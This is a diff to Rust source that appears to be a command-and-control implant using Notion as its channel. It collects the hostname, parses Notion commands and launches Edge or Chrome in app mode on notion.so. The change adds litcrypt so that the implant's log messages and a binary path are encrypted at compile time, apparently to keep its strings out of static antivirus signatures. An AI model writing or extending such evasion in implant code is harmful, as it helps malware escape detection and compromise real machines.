@@ -4,7 +4,8 @@ extern crate tokio;
 extern crate serde_json;
 extern crate whoami;
 extern crate base64;
-
+#[macro_use]
+extern crate litcrypt;
 
 use std::{thread, time};
 use std::env::args;
@@ -16,6 +17,7 @@ use whoami::hostname;
 use reqwest::Client;
 use reqwest::header::{HeaderMap, AUTHORIZATION, CONTENT_TYPE};
 use base64::decode;
+use litcrypt::{lc, use_litcrypt};
 
 mod config;
 use config::{
@@ -32,11 +34,12 @@ mod cmd;
 use cmd::{NotionCommand, CommandType};
 mod logger;
 
+use_litcrypt!();
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     
-    println!("[*] Starting!");
+    println!("{}", lc!("[*] Starting!"));
     
     // Handle config options
     let mut config_options: ConfigOptions;
@@ -76,18 +79,18 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     // Start Notion App if configured to do so
     if config_options.launch_app {
-        logger.info("Launching app".to_string());
-        let browser_cmd: &str;
+        logger.info(lc!("Launching app"));
+        let browser_cmd: String;
         #[cfg(windows)] {
-            browser_cmd = r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe";
+            browser_cmd = r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe".to_string();
         }
         #[cfg(not(windows))] {
-            browser_cmd = "/usr/local/bin/google-chrome";
+            browser_cmd = lc!("/usr/local/bin/google-chrome");
         }
         match Command::new(browser_cmd)
         .arg("--app=https://notion.so")
         .spawn() {
-            Ok(_) => {logger.info("Launching browser".to_string());},
+            Ok(_) => {logger.info(lc!("Launching browser"));},
             Err(e) => {logger.err(e.to_string());}
         };
     }
